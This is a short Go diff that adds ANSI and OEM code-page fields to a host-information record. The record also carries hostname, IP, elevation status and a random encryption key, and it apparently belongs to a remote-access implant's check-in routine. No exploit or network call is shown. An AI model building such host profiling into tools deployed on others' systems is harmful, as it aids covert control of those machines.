@@ -50,6 +50,8 @@ func CreateInfo() ([]byte, []byte) {
 		}
 	}
 
+	acp, oemcp := functions.GetCP()
+
 	randKey := make([]byte, 16)
 	_, _ = rand.Read(randKey)
 
@@ -60,6 +62,8 @@ func CreateInfo() ([]byte, []byte) {
 		Host:       host,
 		Ipaddr:     ip,
 		Elevated:   functions.IsElevated(),
+		Acp:        acp,
+		Oem:        oemcp,
 		Os:         runtime.GOOS,
 		OSVersion:  osVersion,
 		EncryptKey: randKey,
